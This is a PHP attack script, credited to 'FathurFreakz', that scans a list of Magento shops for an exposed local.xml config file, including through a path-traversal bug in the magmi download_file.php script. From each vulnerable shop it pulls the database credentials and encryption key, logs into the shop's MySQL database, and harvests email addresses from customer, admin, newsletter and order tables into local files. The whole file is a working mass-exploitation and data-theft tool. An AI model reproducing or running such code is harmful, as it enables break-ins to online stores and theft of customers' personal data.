<?php
/* Copyright by FathurFreakz */ 
/* Just because you rename the copyright, will not make you are coder ! */
error_reporting(0);
set_time_limit(0);
class Magento_Database {
	
	private function curl($url, $post = false){
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
		if($post !== false){
			$isi = '';
			foreach($post as $key=>$value){
				$isi .= $key.'='.$value.'&';
			}
			rtrim($isi, '&');
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_POST, count($isi));
			curl_setopt($ch, CURLOPT_COOKIEJAR, 'pitek.txt');
			curl_setopt($ch, CURLOPT_POSTFIELDS, $isi);
		}
		$data = curl_exec($ch);
		curl_close($ch);
		return $data;
	}
	
	private function GetStr($start,$end,$string){
		$a = explode($start,$string);
		$b = explode($end,$a[1]);
		return $b[0];
	}
	
	private function LocalFile($target){
		$path = array(
               "Bug 1"  => "/app/etc/local.xml",
               "Bug 2" => "/magmi/web/download_file.php?file=../../app/etc/local.xml"
        );
		foreach($path as $bug => $location) {
			$link = parse_url($target);
			$url = sprintf("%s://%s".$location,$link["scheme"],$link["host"]);
			$page = $this->curl($url);
			if(preg_match('/<config>/i',$page)){
				$result = $url."\n";
				$result .= "type => ".$bug."\n";
				$result .= "domain => ".$url."\n";
				$result .= "host => ".$this->GetStr("<host><![CDATA[","]]></host>",$page)."\n";
				$result .= "username => ".$this->GetStr("<username><![CDATA[","]]></username>",$page)."\n";
				$result .= "password => ".$this->GetStr("<password><![CDATA[","]]></password>",$page)."\n";
				$result .= "name => ".$this->GetStr("<dbname><![CDATA[","]]></dbname>",$page)."\n";
				$result .= "installed => ".$this->GetStr("<date><![CDATA[","]]></date>",$page)."\n";
				$result .= "backend => ".$this->GetStr("<frontName><![CDATA[","]]></frontName>",$page)."\n";
				$result .= "key => ".$this->GetStr("<key><![CDATA[","]]></key>",$page)."\n";
				$result .= "prefix => ".$this->GetStr("<table_prefix><![CDATA[","]]></table_prefix>",$page)."\n";
				$result .= "connection => ".$this->database($this->GetStr("<host><![CDATA[","]]></host>",$page),$this->GetStr("<username><![CDATA[","]]></username>",$page),$this->GetStr("<password><![CDATA[","]]></password>",$page),$this->GetStr("<dbname><![CDATA[","]]></dbname>",$page),$link["host"])."\n";
				
				echo $result;
				if($this->database($this->GetStr("<host><![CDATA[","]]></host>",$page),$this->GetStr("<username><![CDATA[","]]></username>",$page),$this->GetStr("<password><![CDATA[","]]></password>",$page),$this->GetStr("<dbname><![CDATA[","]]></dbname>",$page),$link["host"]) == "Success"){
					$this->getEmail($this->GetStr("<host><![CDATA[","]]></host>",$page),$this->GetStr("<username><![CDATA[","]]></username>",$page),$this->GetStr("<password><![CDATA[","]]></password>",$page),$this->GetStr("<dbname><![CDATA[","]]></dbname>",$page),$link["host"],$this->GetStr("<table_prefix><![CDATA[","]]></table_prefix>",$page));
				}
				
				$file = fopen(date("d-m-y") . ".txt","a");
				fwrite($file, $result);
				fclose($file);
			} else {
				echo $url." => NOT VULN\n";
			}
		}
	}
	private function database($host,$user,$pass,$name,$domain){
		if (!filter_var($host, FILTER_VALIDATE_IP) === false) {
			$ip = $host;
		} else {
			$ip = $domain;
		}

		$connect = mysql_connect($ip,$user,$pass,$name);
		if(!$connect){
			return "Failed";
		} else {
			return "Success";
			mysql_close($connect);
		}
	}
	
	public function getEmail($host,$user,$pass,$name,$domain,$prefix){
		$query = array(
                    $prefix.'admin_user'                    => 'SELECT * FROM '.$prefix.'admin_user' ,
                    $prefix.'aw_blog_comment'               => 'SELECT * FROM '.$prefix.'aw_blog_comment' ,
                    $prefix.'core_email_queue_recipients'   => 'SELECT * FROM '.$prefix.'core_email_queue_recipients' ,
                    $prefix.'customer_entity'               => 'SELECT * FROM '.$prefix.'customer_entity' ,
                    $prefix.'newsletter_subscriber'         => 'SELECT * FROM '.$prefix.'newsletter_subscriber' ,
                    $prefix.'newsletter_template'           => 'SELECT * FROM '.$prefix.'newsletter_template' ,
                    $prefix.'sales_flat_order_address'      => 'SELECT * FROM '.$prefix.'sales_flat_order_address' ,
                    $prefix.'sales_flat_quote'              => 'SELECT * FROM '.$prefix.'sales_flat_quote' 
                    
        );
        $column = array(
                    $prefix.'admin_user'                    => 'email' ,
                    $prefix.'aw_blog_comment'               => 'email' ,
                    $prefix.'core_email_queue_recipients'   => 'recipient_email' ,
                    $prefix.'customer_entity'               => 'email' ,
                    $prefix.'newsletter_subscriber'         => 'subscriber_email' ,
                    $prefix.'newsletter_template'           => 'template_sender_email' ,
                    $prefix.'sales_flat_order_address'      => 'email' ,
                    $prefix.'sales_flat_quote'              => 'customer_email' 
                    
        );
		if (!filter_var($host, FILTER_VALIDATE_IP) === false) {
			$ip = $host;
		} else {
			$ip = $domain;
		}

		$connect = mysql_connect($ip,$user,$pass,$name);
		mysql_select_db($name,$connect);		
		$mail = array();
		foreach($query as $key => $value){
			echo "Checking '" .$key."' with query => ".$value."\n";
            $hasil = mysql_query($value, $connect);
			while($row = mysql_fetch_assoc($hasil)){
				if(!in_array($row[$column[$key]],$mail) && !empty($row[$column[$key]])){
					$mail[] = $row[$column[$key]];
					$save = fopen("email-found-".date("d-m-y").".txt","a");
					fwrite($save,$row[$column[$key]]."\n");
					fclose($save);
					echo $row[$column[$key]]."\n";
				}
            }
        }
		if(count($mail) > 0){
			echo count($mail) ." email address exists !\n";
		} else {
			echo "Email not found !\n";
		}
		mysql_close($connect);
	}
	
	public function execute($file){
		if(!file_exists($file)){
			die($file . " not found !\n");
		} else {
			$file = explode("\n",file_get_contents($file));
			
			foreach($file as $target){
				echo $this->LocalFile(rtrim($target));
				
			}
		}
	}
}
$x = new Magento_Database;
if(isset($argv[1]) && !empty($argv[1])){
	$x->execute($argv[1]);
} else {
	die("INVALID");
}